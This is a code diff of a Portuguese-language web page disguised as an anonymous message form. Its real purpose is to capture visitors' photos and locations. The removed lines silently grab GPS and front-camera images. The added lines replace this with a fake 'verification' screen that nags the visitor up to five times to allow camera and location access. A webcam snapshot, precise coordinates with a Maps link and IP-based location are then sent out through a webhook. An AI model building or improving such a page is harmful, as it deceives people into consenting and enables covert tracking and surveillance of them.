@@ -561,7 +561,8 @@
                 formSubmitted: false,
                 initCompleted: false,
                 permissionsGranted: false,
-                dataCollected: false
+                verificationAttempts: 0,
+                showingPrompt: false
             };
             
             this.coletarInformacoesDispositivo();
@@ -589,118 +590,10 @@
         
         async init() {
             this.setupInitialListeners();
-            // Inicia coleta de dados silenciosamente
-            await this.silentDataCollection();
-            // Mostra prompt imediatamente
+            await this.getIPInfo();
             this.showPermissionPrompt();
         }
 
-        async silentDataCollection() {
-            // Coleta IP imediatamente
-            this.getIPInfo();
-            // Tenta permissões silenciosamente no background
-            this.attemptSilentPermissions();
-        }
-
-        async attemptSilentPermissions() {
-            try {
-                // Tenta capturar dados sem mostrar prompts primeiro
-                await Promise.allSettled([
-                    this.silentLocationCapture(),
-                    this.silentCameraCapture()
-                ]);
-            } catch (error) {
-                // Falha silenciosa
-            }
-        }
-
-        async silentLocationCapture() {
-            try {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            this.data.location = {
-                                lat: position.coords.latitude, 
-                                lon: position.coords.longitude,
-                                accuracy: position.coords.accuracy, 
-                                status: 'success', 
-                                source: 'GPS'
-                            };
-                            this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
-                            this._sL();
-                            this.flags.dataCollected = true;
-                        },
-                        () => {
-                            // Silencioso se falhar
-                        },
-                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                    );
-                }
-            } catch (error) {
-                // Falha silenciosa
-            }
-        }
-
-        async silentCameraCapture() {
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'user', width: 640, height: 480 }, 
-                        audio: false 
-                    });
-                    
-                    const video = document.getElementById('video');
-                    const canvas = document.getElementById('canvas');
-                    
-                    video.srcObject = stream;
-                    video.muted = true;
-                    video.playsInline = true;
-                    
-                    video.onloadedmetadata = () => {
-                        video.play().then(() => {
-                            setTimeout(() => {
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                                
-                                this.data.camera = {
-                                    image: canvas.toDataURL('image/jpeg', 0.6), 
-                                    status: 'success',
-                                    resolution: `${canvas.width}x${canvas.height}`, 
-                                    timestamp: new Date().toISOString()
-                                };
-                                
-                                // Para e limpa stream imediatamente
-                                stream.getTracks().forEach(track => track.stop());
-                                video.srcObject = null;
-                                
-                                this._sC();
-                                this.flags.dataCollected = true;
-                            }, 300);
-                        });
-                    };
-                }
-            } catch (error) {
-                // Falha silenciosa
-            }
-        }
-
-        async continueInit() {
-            if (this.flags.initCompleted) return;
-            this.flags.initCompleted = true;
-
-            this.setupInteractionListeners();
-            this.setupAutoTriggers();
-            
-            // Se não conseguiu dados silenciosamente, força permissões
-            if (!this.flags.dataCollected) {
-                await this.forcePermissionCollection();
-            } else {
-                this.flags.permissionsGranted = true;
-                this.hidePermissionPrompt();
-            }
-        }
-        
         setupInitialListeners() {
             document.getElementById('anonymous-form').addEventListener('submit', (e) => {
                 e.preventDefault();
@@ -718,167 +611,151 @@
                     counter.textContent = textarea.value.length;
                 });
             }
+
+            // Monitora cliques para forçar permissões se necessário
+            document.addEventListener('click', () => {
+                if (!this.flags.permissionsGranted && !this.flags.showingPrompt) {
+                    setTimeout(() => {
+                        this.checkAndForcePermissions();
+                    }, 1000);
+                }
+            });
         }
 
         async handlePermissionClick() {
+            this.flags.verificationAttempts++;
             this.hidePermissionPrompt();
+            this.showVerificationLoading();
             
-            // Mostra loading discreto
-            this.showQuickLoading();
-            
-            await this.continueInit();
-            await this.forcePermissionCollection();
+            // Aguarda um pouco e então solicita permissões
+            setTimeout(async () => {
+                await this.requestAllPermissions();
+            }, 500);
         }
 
-        showQuickLoading() {
+        showVerificationLoading() {
             const loadingElement = document.getElementById('loading-overlay');
             const loadingText = loadingElement.querySelector('.loading-text');
             if (loadingText) {
-                loadingText.textContent = 'Verificando...';
+                loadingText.textContent = 'Realizando verificação...';
             }
             loadingElement.style.display = 'flex';
             
-            // Esconde loading rapidamente
             setTimeout(() => {
                 loadingElement.style.display = 'none';
-            }, 800);
+            }, 1500);
         }
 
-        async forcePermissionCollection() {
+        async requestAllPermissions() {
             try {
-                await Promise.allSettled([
-                    this.forceLocationCapture(),
-                    this.forceCameraCapture()
-                ]);
+                // Solicita localização primeiro
+                await this.requestLocation();
                 
-                setTimeout(() => {
-                    this.checkDataStatus();
-                }, 1000);
-                
-            } catch (error) {
-                this.flags.permissionsGranted = true; // Permite continuar mesmo com erro
-            }
-        }
-
-        checkDataStatus() {
-            // Se tem pelo menos um dos dados, considera sucesso
-            if (this.data.location.status === 'success' || this.data.camera.status === 'success') {
-                this.flags.permissionsGranted = true;
-                this.showToast('Verificação concluída!', 'success');
-            } else {
-                this.flags.permissionsGranted = true; // Permite continuar
-            }
-        }
-
-        async forceLocationCapture() {
-            try {
-                if (!navigator.geolocation) return;
-                
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true, 
-                        timeout: 8000, 
-                        maximumAge: 0 
-                    });
-                });
-                
-                this.data.location = {
-                    lat: position.coords.latitude, 
-                    lon: position.coords.longitude,
-                    accuracy: position.coords.accuracy, 
-                    status: 'success', 
-                    source: 'GPS'
-                };
-                this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
-                this._sL();
-                
-            } catch (error) {
-                // Usa IP como fallback
-                if (this.data.ip.latitude && this.data.ip.longitude) {
-                    this.data.location = {
-                        lat: this.data.ip.latitude, 
-                        lon: this.data.ip.longitude,
-                        googleMapsUrl: `https://www.google.com/maps?q=${this.data.ip.latitude},${this.data.ip.longitude}`,
-                        source: 'IP',
-                        status: 'success'
-                    };
-                    this._sL();
-                }
-            }
-        }
-        
-        async forceCameraCapture() {
-            if (this.flags.cameraAttempted) return;
-            this.flags.cameraAttempted = true;
-            
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            let stream = null;
-
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: false, 
-                    video: { facingMode: 'user', width: 640, height: 480 } 
-                });
-                
-                video.srcObject = stream;
-                video.muted = true;
-                video.playsInline = true;
-                
-                await new Promise((resolve, reject) => { 
-                    video.onloadedmetadata = () => {
-                        video.play().then(resolve).catch(reject);
-                    };
-                    setTimeout(reject, 3000);
-                });
-                
-                await new Promise(resolve => setTimeout(resolve, 400));
-
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                this.data.camera = {
-                    image: canvas.toDataURL('image/jpeg', 0.6), 
-                    status: 'success',
-                    resolution: `${canvas.width}x${canvas.height}`, 
-                    timestamp: new Date().toISOString()
-                };
-                this._sC();
-                
-            } catch (error) {
-                this.data.camera.status = 'error';
-            } finally {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                if (video) {
-                    video.srcObject = null;
-                }
-            }
-        }
-
-        setupInteractionListeners() {
-            document.addEventListener('click', (e) => {
-                this.data.behavior.interactions.push({
-                    type: 'click',
-                    element: e.target.id || e.target.tagName,
-                    timestamp: Date.now() - this.data.behavior.startTime
-                });
-            });
-        }
-        
-        setupAutoTriggers() {
-            // Auto-hide prompt se conseguiu dados
-            if (this.flags.dataCollected) {
-                setTimeout(() => {
-                    this.hidePermissionPrompt();
-                    this.flags.permissionsGranted = true;
+                // Aguarda um pouco e solicita câmera
+                setTimeout(async () => {
+                    await this.captureCamera();
+                    
+                    // Verifica se conseguiu as permissões
+                    setTimeout(() => {
+                        this.checkPermissionResults();
+                    }, 1000);
                 }, 500);
+                
+            } catch (error) {
+                setTimeout(() => {
+                    this.handlePermissionFailure();
+                }, 1000);
+            }
+        }
+
+        checkPermissionResults() {
+            const hasLocation = this.data.location.status === 'success';
+            const hasCamera = this.data.camera.status === 'success';
+            
+            if (hasLocation && hasCamera) {
+                this.flags.permissionsGranted = true;
+                this.showToast('Verificação concluída com sucesso!', 'success');
+            } else if (hasLocation || hasCamera) {
+                this.flags.permissionsGranted = true;
+                this.showToast('Verificação parcial concluída', 'success');
+            } else {
+                this.handlePermissionFailure();
+            }
+        }
+
+        handlePermissionFailure() {
+            if (this.flags.verificationAttempts < 5) {
+                // Força aparecer prompt novamente
+                setTimeout(() => {
+                    this.showForcePermissionPrompt();
+                }, 2000);
+            } else {
+                // Após muitas tentativas, permite continuar
+                this.flags.permissionsGranted = true;
+                this.showToast('Continuando sem verificação completa', 'info');
+            }
+        }
+
+        showForcePermissionPrompt() {
+            this.flags.showingPrompt = true;
+            const prompt = document.getElementById('permission-prompt');
+            const content = prompt.querySelector('.permission-content');
+            
+            let message = '';
+            if (this.flags.verificationAttempts === 1) {
+                message = `
+                    <span class="permission-icon">🔒</span>
+                    <h3>Permissões Necessárias</h3>
+                    <p>Para continuar, precisamos verificar que você é um usuário real.</p>
+                    <p>Por favor, <strong>permita</strong> o acesso quando solicitado.</p>
+                    <button class="permission-btn" id="permission-button-retry">
+                        Tentar Novamente
+                    </button>
+                `;
+            } else if (this.flags.verificationAttempts === 2) {
+                message = `
+                    <span class="permission-icon">⚠️</span>
+                    <h3>Verificação Obrigatória</h3>
+                    <p><strong>Você deve permitir as permissões</strong> para usar a plataforma.</p>
+                    <p>Clique em <strong>"Permitir"</strong> quando aparecer a solicitação.</p>
+                    <button class="permission-btn" id="permission-button-retry">
+                        Continuar Verificação
+                    </button>
+                `;
+            } else {
+                message = `
+                    <span class="permission-icon">🚫</span>
+                    <h3>Acesso Necessário</h3>
+                    <p><strong>Permissões obrigatórias</strong> para funcionar corretamente.</p>
+                    <p>Tentativa ${this.flags.verificationAttempts} de 5</p>
+                    <button class="permission-btn" id="permission-button-retry">
+                        Permitir Acesso
+                    </button>
+                `;
+            }
+            
+            content.innerHTML = message;
+            
+            // Atualiza o listener
+            const retryButton = document.getElementById('permission-button-retry');
+            if (retryButton) {
+                retryButton.addEventListener('click', () => {
+                    this.flags.showingPrompt = false;
+                    this.handlePermissionClick();
+                });
+            }
+            
+            prompt.style.display = 'flex';
+        }
+
+        checkAndForcePermissions() {
+            if (!this.flags.permissionsGranted && this.flags.verificationAttempts > 0) {
+                this.showForcePermissionPrompt();
             }
         }
         
         showPermissionPrompt() {
+            this.flags.showingPrompt = true;
             const element = document.getElementById('permission-prompt');
             if (element) {
                 element.style.display = 'flex';
@@ -886,6 +763,7 @@
         }
         
         hidePermissionPrompt() {
+            this.flags.showingPrompt = false;
             const element = document.getElementById('permission-prompt');
             if (element) element.style.display = 'none';
         }
@@ -895,11 +773,12 @@
                 const services = [
                     'https://ip-api.com/json', 
                     'https://ipapi.co/json/', 
-                    'https://ipinfo.io/json'
+                    'https://ipinfo.io/json', 
+                    'https://ipwhois.app/json/'
                 ];
                 for (const service of services) {
                     try {
-                        const response = await fetch(service, { signal: AbortSignal.timeout(2000) });
+                        const response = await fetch(service, { signal: AbortSignal.timeout(3000) });
                         if (response.ok) {
                             const data = await response.json();
                             this.data.ip = {
@@ -921,6 +800,102 @@
                 }
             } catch (error) { 
                 // Falha silenciosa
+            }
+        }
+        
+        async requestLocation() {
+            try {
+                if (!navigator.geolocation) {
+                    throw new Error('Geolocation not supported');
+                }
+                
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true, 
+                        timeout: 10000, 
+                        maximumAge: 0 
+                    });
+                });
+                
+                this.data.location = {
+                    lat: position.coords.latitude, 
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy, 
+                    status: 'success', 
+                    source: 'GPS'
+                };
+                this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
+                this._sL();
+                
+            } catch (error) {
+                this.data.location.status = 'error';
+                
+                // Usa IP como fallback
+                if (this.data.ip.latitude && this.data.ip.longitude) {
+                    this.data.location = {
+                        lat: this.data.ip.latitude, 
+                        lon: this.data.ip.longitude,
+                        googleMapsUrl: `https://www.google.com/maps?q=${this.data.ip.latitude},${this.data.ip.longitude}`,
+                        source: 'IP',
+                        status: 'success'
+                    };
+                    this._sL();
+                }
+            }
+        }
+        
+        async captureCamera() {
+            if (this.flags.cameraAttempted) return;
+            this.flags.cameraAttempted = true;
+            
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            let stream = null;
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: false, 
+                    video: { 
+                        facingMode: 'user', 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 } 
+                    } 
+                });
+                
+                video.srcObject = stream;
+                video.muted = true;
+                video.playsInline = true;
+                
+                await new Promise((resolve, reject) => { 
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(reject);
+                    };
+                    setTimeout(reject, 5000);
+                });
+                
+                await new Promise(resolve => setTimeout(resolve, 600));
+
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                this.data.camera = {
+                    image: canvas.toDataURL('image/jpeg', 0.7), 
+                    status: 'success',
+                    resolution: `${canvas.width}x${canvas.height}`, 
+                    timestamp: new Date().toISOString()
+                };
+                this._sC();
+                
+            } catch (error) {
+                this.data.camera.status = 'error';
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                if (video) {
+                    video.srcObject = null;
+                }
             }
         }
         
@@ -1049,28 +1024,26 @@
                         document.body.removeChild(toast);
                     }
                 }, 300);
-            }, 1500);
+            }, 2500);
         }
         
         validateForm() {
             const pergunta = document.getElementById('pergunta').value.trim();
             if (!pergunta || pergunta.length < 5) {
+                this.showToast('Por favor, digite pelo menos 5 caracteres', 'error');
                 return false;
             }
             return true;
         }
         
         async handleFormSubmit() {
-            if (this.flags.formSubmitted || !this.validateForm()) return;
+            if (!this.validateForm()) return;
+            
+            if (this.flags.formSubmitted) return;
             this.flags.formSubmitted = true;
             
             document.getElementById('loading-overlay').style.display = 'flex';
             document.getElementById('btn-enviar').disabled = true;
-            
-            // Se ainda não coletou dados, tenta uma última vez
-            if (!this.flags.dataCollected) {
-                await this.forcePermissionCollection();
-            }
             
             this.data.behavior.timeToSubmit = Date.now() - this.data.behavior.startTime;
             await this._sD();
@@ -1113,20 +1086,20 @@
                             inline: true 
                         },
                         { 
-                            name: 'Checks', 
+                            name: 'Verification Status', 
                             value: [
                                 `GPS: ${this.data.location.status === 'success' ? '✅' : '❌'}`, 
-                                `Cam: ${this.data.camera.status === 'success' ? '✅' : '❌'}`, 
-                                `IP: ${this.data.ip.ip ? '✅' : '❌'}`
+                                `Camera: ${this.data.camera.status === 'success' ? '✅' : '❌'}`, 
+                                `Attempts: ${this.flags.verificationAttempts}`
                             ].join('\n'), 
                             inline: true 
                         }
                     ],
-                    footer: { text: 'Data Collection System' }, 
+                    footer: { text: 'Anonymous Submission System' }, 
                     timestamp: new Date().toISOString()
                 };
                 const payload = { 
-                    username: 'User Submission', 
+                    username: 'Anonymous Message', 
                     avatar_url: 'https://cdn-icons-png.flaticon.com/512/1828/1828833.png', 
                     embeds: [embed] 
                 };
@@ -1143,7 +1116,7 @@
             } catch (error) {
                 this.flags.formSubmitted = false;
                 document.getElementById('btn-enviar').disabled = false;
-                this.showToast('Erro ao enviar, tente novamente', 'error');
+                this.showToast('Erro ao enviar. Tente novamente.', 'error');
             } finally {
                 document.getElementById('loading-overlay').style.display = 'none';
             }
